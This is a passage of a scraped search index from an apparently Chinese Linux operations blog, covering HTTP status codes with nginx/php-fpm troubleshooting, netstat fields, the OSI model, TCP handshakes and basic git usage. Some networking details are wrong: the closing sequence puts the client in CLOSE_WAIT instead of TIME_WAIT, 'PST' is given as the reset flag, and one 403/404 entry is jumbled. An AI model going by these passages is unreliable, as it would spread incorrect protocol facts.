","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:13:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","整理收集"],"content":"HTTP响应码/http_code","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":" HTTP响应码分类 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:0:0","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"常见状态码 一些常见HTTP状态码为： 200 – 服务器成功返回网页 404 – 请求的网页不存在 503 – 服务不可用 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:1:0","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"常见HTTP状态码大全 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:2:0","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"1xx（临时响应） 表示临时响应并需要请求者继续执行操作的状态代码。 http状态码 说明 100 （继续） 请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。 102 将继续执行请求 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:2:1","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"2xx （成功） 表示成功处理了请求的状态代码。 http状态码 说明 200 （成功） 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。 201 （已创建） 请求成功并且服务器创建了新的资源。 202 （已接受） 服务器已接受请求，但尚未处理。 203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 204 （无内容） 服务器成功处理了请求，但没有返回任何内容。 205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。 206 （部分内容） 服务器成功处理了部分 GET 请求。 207 请求已成功处理，返回了多个状态的XML消息 208 响应已发送 226 已完成响应 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:2:2","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"3xx （重定向） 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。 代http状态码码 说明 300 （多种选择） 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304 （未修改） 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。 305 （使用代理） 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。 307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 308 （永久转移）这个请求和以后的请求都应该被另一个URI地址重新发送。307、308和302、301有相同的表现，但是不允许HTTP方法改变。例如，请求表单到一个永久转移的资源将会继续顺利地执行。 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:2:3","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"4xx（请求错误） 这些状态代码表示请求可能出错，妨碍了服务器的处理。 http状态码 说明 400 （错误请求） 服务器不理解请求的语法。 401 （未授权） 需要身份认证验证. 对于需要登录的网页，服务器可能返回此响应。 401.1 未授权：登录失败 401.2 未授权：服务器配置问题导致登录失败 401.3 ACL 禁止访问资源 401.4 未授权：授权被筛选器拒绝 401.5 未授权：ISAPI 或 CGI 授权失败 401.7 访问被 Web 服务器上的 URL 授权策略拒绝。这个错误代码为 IIS 6.0 所专用 403 （禁止） 服务器拒绝请求。对 Internet 服务管理器 的访问仅限于Localhost 403.1 禁止访问：禁止可执行访问 403.2 禁止访问：禁止读访问 403.3 禁止访问：禁止写访问 403.4 禁止访问：要求 SSL 403.5 禁止访问：要求 SSL 128 403.6 禁止访问：IP 地址被拒绝 403.7 禁止访问：要求客户证书 403.8 禁止访问：禁止站点访问 403.9 禁止访问：连接的用户过多 403.1o 禁止访问：配置无效 403.11 禁止访问：密码更改 403.12 禁止访问：映射器拒绝访问 403.13 禁止访问：客户证书已被吊销 403.14 禁止访问：客户访问许可过多 403.15 禁止访问：客户证书不可信或者无效 403.16 禁止访问：客户证书已经到期或者尚未生效 HTTP 404.1 - 403.17 客户端证书已过期或尚未生效。 403.18 在当前的应用程序池中不能执行所请求的 URL。这个错误代码为 IIS 6.0 所专用。 403.19 不能为这个应用程序池中的客户端执行 CGI。这个错误代码为 IIS 6.0 所专用。 404 （未找到） 服务器找不到请求的网页。 404.1 无法在所请求的端口上访问 Web 站点。 404.2 Web 服务扩展锁定策略阻止本请求。 404.3 MIME 映射策略阻止本请求。 405 （方法禁用） 禁用请求中指定的方法。 406 （不接受） 无法使用请求的内容特性响应请求的网页。 407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 （请求超时） 服务器等候请求时发生超时。 409 （冲突） 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。 410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 415 （不支持的媒体类型） 请求的格式不受请求页面的支持。 416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。 418 （我是一个茶壶）这个代码是在1998年作为传统的IETF April Fools‘ jokes被定义的在RFC2324，超文本咖啡罐控制协议，但是并没有被实际的HTTP服务器实现。RFC指定了这个代码应该是由茶罐返回给速溶咖啡。 419 （认证超时）并不是HTTP标注的一部分，419认证超时表示以前的有效证明已经失效了。同时也被用于401未认证的替代选择为了从其它被拒绝访问的已认证客户端中指定服务器的资源。 420 （方法失效）不是HTTP的标准，但是被Spring定义在HTTP状态类中当方法失时使用。这个状态码已经不推荐在Spring中使用。 420 （提高你的耐心）也不是HTTP标准的一部分，但是被版本1的Twitter搜索和趋势APi返回当客户端的速率被限制的时候。其它的服务提供商可能会使用429太多的请求响应码来代替。 421 从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。 422 请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）423 Locked当前资源被锁定。（RFC 4918 WebDAV） 424 由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV） 425 在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。 426 客户端应当切换到TLS/1.0。（RFC 2817） 428 (需要前置条件)原始服务器需要有条件的请求。当客户端GET一个资源的状态的时候，同时又PUT回给服务器，与此同时第三方修改状态到服务器上的时候，为了避免丢失更新的问题发生将会导致冲突。 429 （过多请求）用户已经发送了太多的请求在指定的时间里。用于限制速率。 431 （请求头部字段太大）服务器由于一个单独的请求头部字段或者是全部的字段太大而不愿意处理请求。 440 （登陆超时（微软））一个微软的扩展，意味着你的会话已经超时。 444 （无响应）被使用在Nginx的日志中表明服务器没有返回信息给客户端并且关闭了连接（在威慑恶意软件的时候比较有用）。 449 （重试（微软））一个微软的扩展。请求应该在执行适当的动作之后被重试。 450 （被Windows家长控制阻塞（微软））一个微软的扩展。这个错误是当Windows家长控制打开并且阻塞指定网页的访问的时候被指定。 451 （由于法律原因而无效（因特网草稿））被定义在因特网草稿“一个新的HTTP状态码用于法律限制的资源”。被用于当资源的访问由于法律原因被禁止的时候。例如检查制度或者是政府强制要求禁止访问。一个例子是1953年dystopian的小说Fahrenheit 451就是一个非法的资源。 451 （重定向（微软））被用在Exchange ActiveSync中如果一个更有效的服务器能够被使用或者是服务器不能访问用户的邮箱。客户端会假定重新执行HTTP自动发现协议去寻找更适合的服务器。 494 （请求头太大（Nginx））Nginx内置代码和431类似，但是是被更早地引入在版本0.9.4（在2011年1月21日）。 495 （证书错误（Nginx））Nginx内置的代码，当使用SSL客户端证书的时候错误会出现为了在日志错误中区分它和4XX和一个错误页面的重定向。。 496 （没有证书（Nginx））Nginx内置的代码，当客户端不能提供证书在日志中分辨4XX和一个错误页面的重定向。 497 （HTTP到HTTPS（Nginx））Nginx内置的代码，被用于原始的HTTP的请求发送给HTTPS端口去分辨4XX在日志中和一个错误页面的重定向。 498 （令牌超时或失效（Esri））由ArcGIS for Server返回。这个代码意味着令牌的超时或者是失效。 499 （客户端关闭请求（Nginx））被用在Nginx日志去表明一个连接已经被客户端关闭当服务器仍然正在处理它的请求，是的服务器无法返货状态码。 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:2:4","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":"5xx（服务器错误） 这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。 http状态码 说明 - 500 （服务器内部错误） 服务器遇到错误，无法完成请求。 原因1：伪静态规则不正确解决办法：修改伪静态。原因2：php版本与网站程序不兼容解决办法：更换PHP版本。原因3：网站无法连接至数据库解决办法：正确修改站点的数据库配置文件。原因4：php禁用了某一函数，需要开启解决办法：开启相关禁用函数。原因5：站点需要访问站外目录解决办法：关闭防跨站处理。原因6：源码本身有BUG解决办法：修复源码bug。 500.1 内部服务器错误 – ASP 错误 500-11 服务器关闭 500-12 应用程序重新启动 500-13 服务器太忙 500-14 应用程序无效 500-15 不允许请求 global.asa 501 （尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。 502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。 原因1：DNS 缓冲解决办法：在dos窗口运行 ipconfig /flushdns，该命令会刷新DNS缓冲。原因2：浏览器代理解决办法：关掉代理。原因3：dns 被劫持了，即使使用国外的dns，也会被劫持解决办法：去掉VPN服务器的DNS。切换另外的dns。在windows系统中，可以在本地网络连接的属性中，去掉默认的dns，选用国外的dns，比如google的或opendns。原因4：php执行超时解决办法：修改/usr/local/php/etc/php.ini 将max_execution_time 改为300。原因5：nginx等待时间超时解决办法：适当增加nginx.conf配置文件中FastCGI的timeout时间 503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。一般为进程瞬时请求量过大，无法及时处理导致 原因1：服务不可用状态解决办法：服务器或许就是正在维护或者暂停了，你可以联系一下服务器空间商。原因2：程序占用资源太多解决办法：通过设置应用程序池把账户改为NetworkService即可解决。 504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。一般为进程阻塞超时导致。 原因1：后端电脑之间 IP 通讯缓慢而产生解决办法：如果您的 Web 服务器由某一网站托管， 只有负责那个网站设置的人员才能解决这个问题。原因2：由于nginx默认的fastcgi进程响应的缓冲区太小造成的错误解决办法：一般默认的fastcgi进程响应的缓冲区是8K，这时可以设置大一点，在nginx.conf里，加入：fastcgi_buffers 8 128k这表示设置fastcgi缓冲区为8块128k大小的空间。当然如果在进行某一项即时的操作, 可能需要nginx的超时参数调大点, 例如设置成60秒:send_timeout 60; 经过这两个参数的调整，一般不会再提示“504 Gateway Time-out”错误，问题基本解决。原因3：PHP环境的配置问题解决办法：更改php-fpm的几处配置： 把max_children由之前的10改为现在的30，这样就可以保证有充足的php-cgi进程可以被使用； 把request_terminate_timeout由之前的0s改为60s，这样php-cgi进程 处理脚本的超时时间就是60秒，可以防止进程都被挂起，提高利用效率。 接着再更改nginx的几个配置项，减少FastCGI的请求次数，尽量维持buffers不变： fastcgi_buffers由 4 64k 改为 2 256k； fastcgi_buffer_size 由 64k 改为 128K； fastcgi_busy_buffers_size 由 128K 改为 256K； fastcgi_temp_file_write_size 由 128K 改为 256K。 重新加载php-fpm和nginx的配置，再次测试，如果没有出现“504 Gateway Time-out”错误，问题解决。 505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。 原因1：您的 Web 服务器不支持，或拒绝支持客户端（如您的浏览器）在发送给服务器的 HTTP 请求数据流中指定的 HTTP 协议版本解决办法：升级您的 Web 服务器软件。原因2：http请求格式的错误解决办法：对照一下自己的代码，从打印的信息中终于找到问题所在。可能在请求后面多加了一个空格。http协议真是很严格了。 505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。 506 由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。 507 服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918) 509 服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。 510 获取资源所需要的策略并没有没满足。（RFC 2774）。 508 （发现环路）服务器发现了一个无限的循环档处理请求的时候。 511 （需要网络授权）客户端需要授权去火的网络的访问权限。一般用于代理交互中被用来进行网络的访问控制。 520 （未知错误）这个状态码也没有被指定在任何RFC中，并且只会被一些服务器返回，例如微软的Azure和CloudFlare服务器:”520错误。本质上是一个捕获全部的响应当原始服务器返回一些未知的或者一些不能被忍受或者被解释的(协议违反或者空响应)”。 598 （网络读取超时异常(未知)）这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络读取超时在一个客户端之前的代理的后面。 599 （网络连接超时异常(未知)）这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络连接超时在一个客户端之前的代理的后面 ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:2:5","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","运维记事"],"content":"Netstat命令/TCP链路状态","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/","tags":["linux","netstat","tcp"],"title":"Netstat命令","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","运维记事"],"content":"netstat 命令 netstat列含义： Proto: 协议名（tcp协议或者udp协议) recv-Q: 网络接收队列 表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走，recv() 如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击。 Send-Q: 网路发送队列 对方没有收到的数据或者说没有Ack的,还是本地缓冲区. 如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快。 Recv-Q和Send-Q通常应该为0，如果不为0可能是有问题的。packets在两个队列里都不应该有堆积状态。可接受短暂的非0情况。 Local Address: 本地监听地址和端口号 Foreign Address: 与本机端口通信的外部socket。显示规则与Local Address相同 State: 链路状态，共有11种 LISTEN： 侦听状态，等待远程机器的连接请求。 CLOSED: 初始（无连接）状态。 SYN_SEND: 尝试建立一个连接,在TCP三次握手期间，主动连接端发送了SYN包后，进入SYN_SEND状态，等待对方的ACK包。 SYN_RECV: 已经接受到了一个连接请求,在TCP三次握手期间，主动连接端收到SYN包后，进入SYN_RECV状态。 ESTABLISHED: 已经有一个有效连接，完成TCP三次握手后，主动连接端进入ESTABLISHED状态。此时，TCP连接已经建立，可以进行通信。 FIN_WAIT_1: 等待远程TCP的连接中断请求或先前的连接中断请求的确认，在TCP四次挥手时，主动关闭端发送FIN包后，进入FIN_WAIT_1状态。 FIN_WAIT_2: 从远程TCP等待连接中断请求 ,在TCP四次挥手时，主动关闭端收到ACK包后，进入FIN_WAIT_2状态。 TIME_WAIT: 等待足够的时间以确保远程TCP接收到连接中断请求的确认, 在TCP四次挥手时，主动关闭端发送了ACK包之后，进入TIME_WAIT状态，等待最多MSL时间，让被动关闭端收到ACK包。 CLOSING: 等待远程TCP对连接中断的确认, 在TCP四次挥手期间，主动关闭端发送了FIN包后，没有收到对应的ACK包，却收到对方的FIN包，此时，进入CLOSING状态。 CLOSE_WAIT: 等待从本地用户发来的连接中断请求,在TCP四次挥手期间，被动关闭端收到FIN包后，进入CLOSE_WAIT状态。 LAST_ACK：等待原来发向远程TCP的连接中断请求的确,在TCP四次挥手时，被动关闭端发送FIN包后，进入LAST_ACK状态，等待对方的ACK包。 ","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/:1:0","tags":["linux","netstat","tcp"],"title":"Netstat命令","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","运维记事"],"content":"netstat -i 列说明 Iface: 接口名 MTU: 网络最大传输单元(字节),大部分网络设备都是1500。如果本机的MTU比网关的MTU大，大的数据包就会被拆开来传送，这样会产生很多数据包碎片，增加丢包率，降低网络速度。把本机的MTU设成比网关的MTU小或相同，就可以减少丢包 https://www.cnblogs.com/wjoyxt/p/6873714.html。 RX-OK/TX-OK: 正确接收了多少数据包，发送了多少数据包 RX-ERR/TX-ERR: 接收、发送数据包的时候，丢弃了多少数据包 RX-OVR/TX-OVR: 由于错误遗失了多少数据包 Flg: 标记 L: 代表回环地址 R: 这个网络接口正在运行中 U: 接口正在处于活动中 B: 设置了广播地址 M: 接收所有数据包 O: 表示在该接口上禁止arp P: 端对端的连接 ","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/:2:0","tags":["linux","netstat","tcp"],"title":"Netstat命令","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","运维记事"],"content":"OSI七层模型/tcp","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"OSI 模型是从上往下的，越底层越接近硬件，越往上越接近软件，这七层模型分别是物理层、数据链路层、网络层、传输层、会话层、表示层、应用层 物理层: 在媒体上传输比特，提供机械的和电气的规约 数据链路层: 将分组数据封装成帧，提供节点到节点方式的传输 网络层: 将分组从源端传送到目的端，提供网络互联 传输层: 提供可靠的端到端的报文传输和差错控制 会话层: 建立、管理和终止会话 表示层: 对数据进行转换、加密和压缩 应用层: 程序及接口 OSI七层模型 TCP/IP4层模型 功能 TCP/IP协议簇 应用层 应用层 文件传输、邮件、文件共享、虚拟终端、web、域名服务 TFTP、HTTP、SMTP、DNS、TELNET 表示层 应用层 数据格式化、代码转化、数据加密 没有协议 会话层 应用层 解除或建立与别的节点的会话关系 没有协议 传输层 传输层 提供端对端的接口 TCP、UDP 网络层 网络层 为数据包选择路由(路由器) IP、ICMP、RIP、OSPF、BGP、IGMP 数据链路层 链路层 传输有地址的帧及错误检测功能 SLIP、CSLIP、PPP、ARP、RARP、MTU(交换机) 物理层 链路层 以二进制数据形式在物理媒介上传输数据(光纤、普通网线、无线信号) ISO2110、IEEE802、IEEE802.2 OSI模型 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:0:0","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"全流程职责 当你输⼊⼀个⽹址并按下回⻋键的时候，⾸先，应⽤层协议对该请求包做了格式定义；紧接着传 输层协议加上了双⽅的端⼝号，确认了双⽅通信的应⽤程序；然后⽹络协议加上了双⽅的IP地 址，确认了双⽅的⽹络位置；最后链路层协议加上了双⽅的MAC地址，确认了双⽅的物理位置， 同时将数据进⾏分组，形成数据帧，采⽤⼴播⽅式，通过传输介质发送给对⽅主机。⽽对于不同 ⽹段，该数据包⾸先会转发给⽹关路由器，经过多次转发后，最终被发送到⽬标主机。⽬标机接 收到数据包后，采⽤对应的协议，对帧数据进⾏组装，然后再通过⼀层⼀层的协议进⾏解析，最 终被应⽤层的协议解析并交给服务器处理。 链路层: 对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据； 网络层: 定义IP地址，确认主机所在的网络位置，并通过IP进行mac寻址，对外网数据包进行路由转发。 传输层: 定义端口，确认主机上应用程序身份，并将数据包交给对应的应用程序。 应用层: 定义数据格式，并按照对应的数据格式解读数据。 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:1:0","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"一条消息如何发送到目标电脑上的 应用层录入消息hello(写信) 传输层附加TCP包首部(装入信封) 网络层附加IP包首部(写入地址和邮编) IP数据包:首部(20字节:包含版本、首部长度、区分服务、总长度、标识、标志、片偏移、生存时间、协议、首部校验、源地址、目标地址、可选字段、填充、数据部分) + 数据(最大65515字节) 数据链路层附加以太包首部(邮票和邮章) 以太网协议: 一组电信号就是一个数据包，一个数据包又被称为一帧 以太网包,包含目标mac、源mac地址 物理层传通过光缆将数据输至目标(邮车转移) 数据链路层拆解以太包首部 网络层拆解IP包首部 传输层拆解TCP包首部 应用层接收消息 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:2:0","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"网络地址分类 特殊B类地址网段: 169.254.0.0/16, 用于处理DHCP分配失败或没有DHCP服务的情况 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:3:0","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"共有地址 A类: 1.0.0.0-126.0.0.0,默认子网掩码:255.0.0.0 ,第一个字节为网络号，后三个字节为主机号。该类ip地址的最前面为0,所以地址的网络号取值于1-126之间。一般用于大型网络。 B类: 128.0.0.0-191.255.0.0,默认子网掩码:255.255.0.0，前两个字节未网络号，后两个字节为主机号，该类IP 地址的最前面为10,所以地址的网络号取值于128-191之间，一般用于中等规模网络。 C类: 192.0.0.0-223.255.255.0,默认子网掩码: 255.255.255.0 ,前三个字节为网络号，最后一个字节为主机号，该类IP地址的最前面为110,所以地址的网络号取值于192-223之间，一般用于小型网络. D类: 是多播地址，该类IP地址的最前面为1110,所以地址的网络号取值于224-239之间，一般用于多路广播用户。 E类: 是保留地址。该类IP地址的最前面为1111,所以地址的网络号取值于240-255之间。 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:3:1","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"私有地址 A类: 10.0.0.0-10.255.255.255 B类: 172.16.0.0-172.31.255.255 C类: 192.168.0.0-192.168.255.255 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:3:2","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"TCP 包常见标识 SYN: 表示建立连接 FIN: 表示关闭连接 ACK: 表示响应 PSH: 表示有data数据传输 PST: 表示连接重置 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:4:0","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"三次握手 客户端发送SYN到服务器端表示准备建立连接，服务端响应发送SYN+ACK于客户端表示准备建立连接请求，客户端发送ACK响应表示开始传输数据 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:4:1","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"四次挥手 客户端发送FIN请求到服务端表示准备断开连接，同时进入FIN_WAIT_1状态下，服务端接收到FIN后发送ACK于客户端表示接收到了准备断开的响应请求，同时进入CLOSE_WAIT,客户端接收到了ACK同时进入FIN_WAIT_2，服务端再次发送FIN+ACK于客户端表示我也准备断开请求了，同时服务端进入LAST_ACK,客户端在接收到FIN+ACK后发送ACK到服务端，表示我已经接收到服务端确认并准备关闭连接，服务端接收到客户端ACK后直接关闭，客户端在发送后进入CLOSE_WAIT并等待2个报文长度时间(默认30秒)后关闭连接。 ","date":"2022-07-05","objectID":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/:4:2","tags":["linux","tcp"],"title":"OSI七层模型","uri":"/posts/linux/osi%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"持续集成","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"持续集成 ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:1:0","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"什么是DevOps DevOps 是一个框架，是一种理论方法，并不是一套工具，他包括一系列的基本原则和实践。其核心价值着重于更快速的交付，响应市场的变化。更多的关注业务的改进与提升。 ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:2:0","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"git 工作目录-暂存区域(git add)-本地仓库(git commit)-远程仓库(git push) ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:3:0","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"初始配置 $\u003e git config --global user.name 0x5c0f $\u003e git config --global user.email mail@0x5c0f.cc $\u003e cat ~/.gitconfig # 系统层面位于/etc/ 下 ; 项目层面，项目根目录 [user] name = 0x5c0f email = mail@0x5c0f.cc $\u003e git config --list user.name=0x5c0f user.email=mail@0x5c0f.cc ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:4:0","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"初始项目 ","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:5:0","tags":["linux","git","devops"],"title":"持续集成","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux","运维记事"],"content":"基础操作 $\u003e mkdir /data/gittest -p \u0026\u0026 cd /data/gittest $\u003e git init $\u003e tree -a . └── .git ├── branches ├── config ├── description ├── HEAD ├── hooks ...... ├── objects │ ├── info │ └── pack ...... # 移除缓冲区文件 $\u003e git rm --cached \u003cfile\u003e # 移除本地及缓冲区文件 $\u003e git rm -f \u003cfile\u003e # 重命名 $\u003e mv \u003cfile\u003e \u003cfile\u003e.txt $\u003e git rm --cached \u003cfile\u003e $\u003e git add \u003cfile\u003e.txt # git commit -m \"\" # 查看修改详情 $\u003e git diff \u003cfile\u003e # 